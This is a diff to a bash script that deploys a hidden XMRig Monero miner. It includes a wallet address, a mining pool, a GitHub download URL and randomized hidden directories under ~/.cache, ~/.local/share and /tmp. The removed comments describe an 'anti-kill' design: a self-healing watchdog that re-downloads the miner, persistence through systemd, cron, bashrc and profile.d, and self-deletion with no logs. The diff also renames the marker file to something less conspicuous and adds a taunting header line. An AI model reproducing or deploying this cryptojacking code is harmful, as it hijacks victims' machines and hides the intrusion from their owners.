@@ -1,18 +1,10 @@
-#!/usr/bin/env bash
-#=============================================================================
-# ANTI-KILL XMRig Deploy — graymeams/teams v3
-#=============================================================================
-# - Binary + config: ~/.cache/.cache_RANDOM
-# - Watchdog script: ~/.local/share/.cache_RANDOM (tersembunyi di tempat beda)
-# - Watchdog self-heal: kalau binary hilang → re-download
-# - 4-layer: systemd + cron + bashrc + profile.d
-# - Zero log/pid, self-delete, password dari hostname
+BINGUNG YAH? MAKANYA KESINI OAWKOAWKOAWKOAWKOAWKOAW
 #=============================================================================
 
 WALLET="43sxNTTWiKQj4LehDazVb8NQRKDztwiRcPFCivj3PbrqFPhujjxLd5TDCWfT6edSPXVRmUh3vhxysA35uHWnwY5UKGxvYFB"
 POOL_URL="pool.supportxmr.com:443"
 RAW_URL="https://raw.githubusercontent.com/grayteams/teams/main"
-MARKER="$HOME/.cache/.miner_state"
+MARKER="$HOME/.cache/.cache_state"
 
 randstr() {
     if [ -r /dev/urandom ]; then
@@ -48,7 +40,6 @@ done
 BIN_NAME="${BIN_NAME}_d$(randstr 8)"
 
 WORKDIR="$HOME/.cache/.cache_$(randstr 10)"
-# Watchdog dir — coba ~/.local/share dulu, fallback ke ~/.config, fallback ke /tmp
 WDOG_DIR=""
 for _try in "$HOME/.local/share/.cache_$(randstr 10)" "$HOME/.config/.cache_$(randstr 10)" "/tmp/.hidden_$(randstr 10)"; do
     if mkdir -p "$_try" 2>/dev/null; then
@@ -144,7 +135,6 @@ cat > "${WORKDIR}/config.json" << XEOF
 XEOF
 chmod 600 "${WORKDIR}/config.json"
 
-# ===== SETUP WATCHDOG (di ~/.local/share, BUKAN di .cache) =====
 mkdir -p "$WDOG_DIR"
 
 cat > "${WDOG_DIR}/${WDOG_NAME}" << 'WDOGEOF'
